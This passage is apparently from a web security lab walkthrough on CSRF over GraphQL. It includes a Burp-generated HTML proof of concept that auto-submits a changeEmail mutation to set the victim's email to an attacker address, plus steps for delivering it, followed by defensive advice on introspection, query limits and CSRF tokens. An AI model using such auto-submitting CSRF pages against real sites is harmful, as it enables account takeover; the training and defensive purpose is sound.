    query=%0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++changeEmail%28input%3A+%24input%29+%7B%0A++++++++++++email%0A++++++++%7D%0A++++%7D%0A&operationName=changeEmail&variables=%7B%22input%22%3A%7B%22email%22%3A%22hacker%40hacker.com%22%7D%7D
                                    

Right-click the request and select Engagement tools > Generate CSRF PoC. Burp displays the CSRF PoC generator dialog.

poc : <html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0aed003b04fcd59380dc1718000e0035.web-security-academy.net/graphql/v1" method="POST">
      <input type="hidden" name="query" value="&#10;&#32;&#32;&#32;&#32;mutation&#32;changeEmail&#40;&#36;input&#58;&#32;ChangeEmailInput&#33;&#41;&#32;&#123;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;changeEmail&#40;input&#58;&#32;&#36;input&#41;&#32;&#123;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;email&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#125;&#10;&#32;&#32;&#32;&#32;&#125;&#10;" />
      <input type="hidden" name="operationName" value="changeEmail" />
      <input type="hidden" name="variables" value="&#123;&quot;input&quot;&#58;&#123;&quot;email&quot;&#58;&quot;hackedpwned&#64;hacker&#46;com&quot;&#125;&#125;" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>


Amend the HTML in the CSRF PoC generator dialog so that it changes the email a third time. This step is necessary because otherwise the exploit won't make any changes to the current email address at the time it is run. Likewise, if you test the exploit before delivering, make sure that you change the email from whatever it is currently set to before delivering to the victim.

Copy the HTML.

In the lab, click Go to exploit server.

Paste the HTML into the exploit server and click Deliver exploit to victim to solve the lab.


#Preventing GraphQL attacks
To prevent many common GraphQL attacks, take the following steps when you deploy your API to production:

If your API is not intended for use by the general public, disable introspection on it. This makes it harder for an attacker to gain information about how the API works, and reduces the risk of unwanted information disclosure.

For information on how to disable introspection in the Apollo GraphQL platform, see this blog post.

If your API is intended for use by the general public then you will likely need to leave introspection enabled. However, you should review the API's schema to make sure that it does not expose unintended fields to the public.

Make sure that suggestions are disabled. This prevents attackers from being able to use Clairvoyance or similar tools to glean information about the underlying schema.

In Apollo Server v4 and above, you can disable suggestions using the hideSchemaDetailsFromClientErrors option. For earlier versions, see this GitHub thread for a workaround.

Make sure that your API's schema does not expose any private user fields, such as email addresses or user IDs.

Preventing GraphQL brute force attacks
It is sometimes possible to bypass standard rate limiting when using GraphQL APIs. For an example of this, see the Bypassing rate limiting using aliases section.

With this in mind, there are design steps that you can take to defend your API against brute force attacks. This generally involves restricting the complexity of queries accepted by the API, and reducing the opportunity for attackers to execute denial-of-service (DoS) attacks.

To defend against brute force attacks:

Limit the query depth of your API's queries. The term "query depth" refers to the number of levels of nesting within a query. Heavily-nested queries can have significant performance implications, and can potentially provide an opportunity for DoS attacks if they are accepted. By limiting the query depth your API accepts, you can reduce the chances of this happening.

Configure operation limits. Operation limits enable you to configure the maximum number of unique fields, aliases, and root fields that your API can accept.

Configure the maximum amount of bytes a query can contain.

Consider implementing cost analysis on your API. Cost analysis is a process whereby a library application identifies the resource cost associated with running queries as they are received. If a query would be too computationally complex to run, the API drops it.

More information
For information on how to implement these features in Apollo, see this blog post.

Preventing CSRF over GraphQL
To defend against GraphQL CSRF vulnerabilities specifically, make sure of the following when designing your API:

Your API only accepts queries over JSON-encoded POST.

The API validates that content provided matches the supplied content type.

The API has a secure CSRF token mechanism.













```
